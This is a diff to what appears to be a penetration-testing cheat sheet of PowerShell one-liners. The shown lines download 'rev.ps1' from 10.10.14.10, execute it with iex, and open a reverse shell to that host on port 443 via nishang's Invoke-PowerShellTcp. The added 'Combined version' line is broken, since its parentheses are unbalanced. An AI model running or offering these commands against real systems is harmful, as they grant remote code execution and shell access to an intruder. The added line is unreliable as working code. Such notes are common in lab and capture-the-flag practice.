@@ -52,6 +52,9 @@ Invoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.14.10/
 
 # Short version
 iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
+
+# Combined version
+iex (iwr('http://10.10.14.10/rev.ps1')
 ```
 
 <small>*Note: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>
